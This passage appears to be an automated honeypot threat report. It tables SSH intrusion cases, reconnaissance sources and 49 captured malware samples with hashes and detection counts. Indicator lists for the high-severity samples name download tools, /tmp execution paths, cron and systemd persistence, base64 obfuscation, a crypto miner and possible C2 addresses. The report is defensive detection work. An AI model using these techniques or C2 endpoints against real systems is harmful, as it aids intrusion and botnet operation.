| IR-bbb144afc54a | HIGH | `195.178.110[.]228` | 2026-11-14 00:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-30e28ab5baf5 | HIGH | `195.178.110[.]78` | 2026-11-14 00:58 | Y | 0 | 0 | `T1078` |
| IR-98a64a89ccbe | HIGH | `195.178.110[.]228` | 2026-11-14 00:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c54e83637819 | HIGH | `77.90.185[.]29` | 2026-11-14 01:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-553fe8ec20d1 | HIGH | `160.119.66[.]206` | 2026-11-14 01:12 | Y | 6 | 3 | `T1059.004 · T1078 · T1105` |
| IR-3ec05047367b | HIGH | `160.119.66[.]206` | 2026-11-14 01:12 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-7bd0158e3f59 | HIGH | `92.118.39[.]71` | 2026-11-14 01:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d36f28fa99c9 | HIGH | `78.128.112[.]74` | 2026-11-14 01:17 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8c967d4eeb9d | HIGH | `92.118.39[.]71` | 2026-11-14 01:18 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-cda3de15a720 | HIGH | `92.118.39[.]71` | 2026-11-14 01:20 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-20ca15afe1a0 | HIGH | `92.118.39[.]71` | 2026-11-14 01:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-def42912cd9c | HIGH | `92.118.39[.]71` | 2026-11-14 01:24 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1830cca35660 | HIGH | `92.118.39[.]71` | 2026-11-14 01:25 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1e8b166dd491 | HIGH | `177.207.250[.]1` | 2026-11-14 01:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e0a9879f6126 | HIGH | `104.194.37[.]176` | 2026-11-14 01:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5931ceacca91 | HIGH | `123.123.196[.]140` | 2026-11-14 01:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b794c574e542 | HIGH | `173.79.110[.]32` | 2026-11-14 01:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-32bd8146a80c | HIGH | `92.118.39[.]71` | 2026-11-14 01:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a4e39ea77b30 | HIGH | `92.118.39[.]71` | 2026-11-14 01:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a13120e3099b | HIGH | `92.118.39[.]71` | 2026-11-14 01:32 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-03cc5474bfce | HIGH | `92.118.39[.]71` | 2026-11-14 01:34 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ce53985849c1 | HIGH | `85.175.194[.]65` | 2026-11-14 01:35 | Y | 0 | 0 | `T1078 · T1592` |
| IR-77df321e499b | HIGH | `92.118.39[.]71` | 2026-11-14 01:36 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5dc72f18432b | HIGH | `119.204.122[.]94` | 2026-11-14 01:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-25f72b3a2acc | HIGH | `196.188.93[.]169` | 2026-11-14 01:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-95989b553f3c | HIGH | `92.118.39[.]71` | 2026-11-14 01:38 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-80b3f3a9f644 | HIGH | `92.118.39[.]71` | 2026-11-14 01:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5e5ed948877c | HIGH | `175.115.29[.]122` | 2026-11-14 01:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b47e8d3ae477 | HIGH | `92.118.39[.]71` | 2026-11-14 01:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9751c45ecb78 | HIGH | `92.118.39[.]71` | 2026-11-14 01:44 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-998d9b42ae60 | HIGH | `92.118.39[.]71` | 2026-11-14 01:46 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-2340961b0fe1 | HIGH | `89.121.255[.]194` | 2026-11-14 01:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b57dbd652671 | HIGH | `213.66.197[.]199` | 2026-11-14 01:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ff05716a0f23 | HIGH | `92.118.39[.]71` | 2026-11-14 01:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c67a62f28fcd | HIGH | `92.118.39[.]71` | 2026-11-14 01:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3e6450e18134 | HIGH | `92.118.39[.]71` | 2026-11-14 01:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0f2812cdb27a | HIGH | `216.226.76[.]30` | 2026-11-14 01:53 | Y | 3 | 0 | `T1078` |
| IR-7eea34350ff5 | HIGH | `92.118.39[.]71` | 2026-11-14 01:53 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f1bdb4272dde | HIGH | `92.118.39[.]71` | 2026-11-14 01:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-12e3d05cf55d | HIGH | `92.118.39[.]71` | 2026-11-14 01:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-900596f9d12d | HIGH | `176.53.159[.]196` | 2026-11-14 01:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8e534c0e3a31 | HIGH | `197.156.113[.]122` | 2026-11-14 01:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a4f2c8986f2d | HIGH | `178.178.194[.]135` | 2026-11-14 01:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-551f8ebb4630 | HIGH | `92.118.39[.]71` | 2026-11-14 01:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b990200df64b | HIGH | `92.118.39[.]71` | 2026-11-14 02:01 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-56922dc978dd | HIGH | `92.118.39[.]71` | 2026-11-14 02:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f5b73e1ae73c | HIGH | `92.118.39[.]71` | 2026-11-14 02:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b24470a7bf3d | HIGH | `92.118.39[.]71` | 2026-11-14 02:07 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e3a91387fbc3 | HIGH | `183.104.220[.]152` | 2026-11-14 02:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8ed81a4e75f9 | HIGH | `152.67.48[.]120` | 2026-11-14 02:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fef9413a73cf | HIGH | `92.118.39[.]71` | 2026-11-14 02:09 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-a62b38eb8489 | HIGH | `92.118.39[.]71` | 2026-11-14 02:11 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ceefcad4d5db | HIGH | `92.118.39[.]71` | 2026-11-14 02:13 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-978e0acf9022 | HIGH | `92.118.39[.]71` | 2026-11-14 02:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c9c46e8fdd8e | HIGH | `92.118.39[.]71` | 2026-11-14 02:17 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-616296522ec7 | HIGH | `92.118.39[.]71` | 2026-11-14 02:19 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b5c27010448a | HIGH | `92.118.39[.]71` | 2026-11-14 02:21 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e3c55829a256 | HIGH | `92.118.39[.]71` | 2026-11-14 02:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-eb44bccd6703 | HIGH | `77.239.124[.]252` | 2026-11-14 02:23 | Y | 0 | 0 | `T1078` |
| IR-56ab5349c279 | HIGH | `92.118.39[.]71` | 2026-11-14 02:25 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-29da988fcb7e | HIGH | `92.118.39[.]71` | 2026-11-14 02:27 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d0adbd7b1067 | HIGH | `92.118.39[.]71` | 2026-11-14 02:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-10d996670ed5 | HIGH | `176.53.159[.]196` | 2026-11-14 02:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-8e6aee8e8d52 | HIGH | `70.187.116[.]20` | 2026-11-14 02:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-42573b11218a | HIGH | `116.48.151[.]136` | 2026-11-14 02:38 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4ade1ab2bd01 | HIGH | `81.222.232[.]205` | 2026-11-14 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ffe88bfda254 | HIGH | `187.58.66[.]231` | 2026-11-14 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5df2b187e669 | HIGH | `98.26.13[.]10` | 2026-11-14 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-22f2971ab5da | HIGH | `178.178.222[.]61` | 2026-11-14 02:39 | Y | 0 | 0 | `T1078 · T1592` |
| IR-62c1ce956d15 | HIGH | `193.32.162[.]15` | 2026-11-14 02:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0d869cd57c6a | HIGH | `195.178.110[.]78` | 2026-11-14 02:46 | Y | 0 | 0 | `T1078` |
| IR-6c598bcea4f6 | HIGH | `35.210.19[.]47` | 2026-11-14 02:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0bfe361bc547 | HIGH | `39.123.251[.]254` | 2026-11-14 02:48 | Y | 0 | 0 | `T1078 · T1592` |
_… 1 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `216.249.4[.]20` | **2** | 2026-11-14 00:13 | 2026-11-14 02:13 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.118.50[.]227` | 1 | 2026-11-14 00:03 | 2026-11-14 00:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.206.131[.]33` | 1 | 2026-11-14 00:24 | 2026-11-14 00:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]144` | 1 | 2026-11-14 00:22 | 2026-11-14 00:22 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `110.86.189[.]115` | 1 | 2026-11-14 01:29 | 2026-11-14 01:29 | 13s | 0 | `T1592` | 🟢 LOW |
| `114.220.176[.]69` | 1 | 2026-11-14 00:24 | 2026-11-14 00:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.180.64[.]141` | 1 | 2026-11-14 02:47 | 2026-11-14 02:47 | 9s | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | 1 | 2026-11-14 00:54 | 2026-11-14 00:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.181.18[.]181` | 1 | 2026-11-14 01:54 | 2026-11-14 01:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `190.109.227[.]85` | 1 | 2026-11-14 02:29 | 2026-11-14 02:30 | 32s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-14 00:41 | 2026-11-14 00:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.32.162[.]15` | 1 | 2026-11-14 02:45 | 2026-11-14 02:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.220.156[.]232` | 1 | 2026-11-14 01:40 | 2026-11-14 01:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.63.225[.]145` | 1 | 2026-11-14 01:44 | 2026-11-14 01:45 | 27s | 0 | `T1592` | 🟢 LOW |
| `216.126.86[.]39` | 1 | 2026-11-14 02:42 | 2026-11-14 02:42 | 16s | 0 | `T1592` | 🟢 LOW |
| `216.226.76[.]30` | 1 | 2026-11-14 01:22 | 2026-11-14 01:22 | 14s | 0 | `T1592` | 🟢 LOW |
| `221.156.173[.]44` | 1 | 2026-11-14 00:43 | 2026-11-14 00:43 | 15s | 0 | `T1592` | 🟢 LOW |
| `223.71.141[.]194` | 1 | 2026-11-14 01:56 | 2026-11-14 01:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `31.202.142[.]69` | 1 | 2026-11-14 01:10 | 2026-11-14 01:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `35.210.19[.]47` | 1 | 2026-11-14 02:47 | 2026-11-14 02:47 | 2s | 0 | `T1592` | 🟢 LOW |
| `38.179.51[.]24` | 1 | 2026-11-14 02:18 | 2026-11-14 02:18 | 13s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-11-14 01:08 | 2026-11-14 01:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.201.113[.]62` | 1 | 2026-11-14 01:40 | 2026-11-14 01:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `5.23.53[.]34` | 1 | 2026-11-14 01:41 | 2026-11-14 01:41 | 30s | 0 | `T1592` | 🟢 LOW |
| `54.226.205[.]254` | 1 | 2026-11-14 01:23 | 2026-11-14 01:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]92` | 1 | 2026-11-14 02:02 | 2026-11-14 02:02 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.49.1[.]80` | 1 | 2026-11-14 01:37 | 2026-11-14 01:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]252` | 1 | 2026-11-14 00:36 | 2026-11-14 00:36 | 3s | 0 | `T1592` | 🟢 LOW |
| `78.128.112[.]74` | 1 | 2026-11-14 01:17 | 2026-11-14 01:18 | 6s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]71` | 1 | 2026-11-14 01:27 | 2026-11-14 01:27 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `95.47.59[.]253` | 1 | 2026-11-14 00:00 | 2026-11-14 00:00 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` | Shell Script | `0583d9e18684b629...` | 70/100 | 🔴 HIGH | **2/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0c99433c7d433d65ab890dcee20b330f262379d532bc76f91e18f09ecfa5fb54` | Shell Script | `0c99433c7d433d65...` | 30/100 | 🟢 LOW | 0/75 ✅ |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0de787cffbec4dcc42e0ecd9491795c7dfe8fe4a955cb67a87544d5c36070982` | ELF Binary (Linux executable) (x86-64 64-bit) | `0de787cffbec4dcc...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `187b67e5e2116293144f4009b1f224ed09eea924dd4ade00741a66792a63b45a` | ELF Binary (Linux executable) (x86-64 64-bit) | `187b67e5e2116293...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` | ELF Binary (Linux executable) (MIPS 32-bit) | `1913ed2ad175632b...` | 86/100 | 🔴 HIGH | **42/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `19e78c00d07f011fcb708ffb12f8dd2fd0f1e57faaf21129b53c7f68ae611e60` | ELF Binary (Linux executable) (x86-64 64-bit) | `19e78c00d07f011f...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1c847d3bd3ef4bf7e21a7091f1479e0e2ca432585ebea996653845b9adfb150e` | ELF Binary (Linux executable) (x86-64 64-bit) | `1c847d3bd3ef4bf7...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ec20680994f17b88492809aa5d135fb463c04ec5868639c5515126e2149a240` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ec20680994f17b8...` | 34/100 | 🟢 LOW | **10/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`0583d9e18684b6297a1219d34dd99c1045658f58c3e9a74ca060d8499a5a0439` (0583d9e18684b6297a1219d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Hardware recon` — `cat /proc/cpuinfo`

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`1913ed2ad175632b1b75e99bf5e291f551302b16dea51df318379e77a36f1ce9` (1913ed2ad175632b1b75e99b...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`
- `Crypto miner binary` — `xmrig`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `70.184.75[.]32` | US | Cox Communications | **100** ⚠️ | 1 |
| `177.207.250[.]1` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 31 |
| `195.178.110[.]78` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 8 |
| `196.188.93[.]169` | ET | Ethio Telecom | **100** ⚠️ | 50 |
| `186.96.158[.]180` | MX | TOTAL PLAY TELECOMUNICACIONES, S.A.P.I. DE C.V. | **100** ⚠️ | 0 |
| `68.225.62[.]203` | US | Cox Communications | **100** ⚠️ | 7 |
| `89.121.255[.]194` | RO | Orange Romania Data Network | **100** ⚠️ | 20 |
| `5.23.53[.]34` | RU | JSC TIMEWEB | **100** ⚠️ | 2 |
| `54.226.205[.]254` | US | Amazon Technologies Inc. | **100** ⚠️ | 3 |
| `35.210.19[.]47` | BE | Google LLC | **100** ⚠️ | 5 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 131 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 127 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 78 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 5 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 3 |

---

## 🔕 False Positive Summary (14 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 17 below threshold 25 | 1 |
